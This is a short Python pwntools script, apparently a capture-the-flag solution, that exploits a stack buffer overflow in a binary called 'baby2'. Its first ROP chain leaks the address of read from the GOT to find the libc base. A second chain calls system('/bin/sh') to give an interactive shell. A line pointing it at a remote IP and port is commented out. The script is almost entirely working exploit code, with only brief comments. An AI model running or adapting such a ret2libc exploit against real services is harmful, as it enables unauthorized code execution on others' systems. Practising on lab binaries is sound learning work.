from pwn import *
p = process("./baby2")
#p=remote("144.91.77.120",7777)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

payload = "A"*40

payload += p64(0x0000000000400733) # pop rdi
payload += p64(0x0000000000601020) # read got
payload += p64(0x00000000004004f0) # printf plt
payload += p64(0x0000000000400636) # main

p.recvuntil('? ')
p.sendline(payload)
#leak aldim
p.recvline()
libc_base = u64(p.recv(6).ljust(8, '\0')) - libc.symbols['read']
log.info("libc_base: %x"  % libc_base)
#libc_base aldim
system_offset = libc_base + libc.symbols['system']
log.info('system_offset : ' +hex(system_offset))

binsh_offset = libc_base + next(libc.search('/bin/sh\x00'))
log.info('binsh_offset :' +hex(binsh_offset))

payload ='A'*40
payload += p64(0x0000000000400733) #pop rdi
payload += p64(binsh_offset)
payload += p64(system_offset)
p.sendline(payload)


p.interactive()

